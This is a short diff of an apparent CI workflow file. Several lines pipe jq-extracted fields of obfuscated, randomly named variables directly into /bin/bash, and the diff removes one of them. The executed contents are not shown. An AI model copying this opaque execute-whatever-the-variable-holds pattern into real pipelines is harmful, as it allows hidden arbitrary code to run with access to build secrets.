@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$euwb131" | jq -r .qqe7036 | /bin/bash
           echo $fzf2 | jq -r .wmita86 | /bin/bash
           echo $kvte1277 | jq -r .zda09878 | /bin/bash
-          echo $sxp1796 | jq -r .fa7953 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
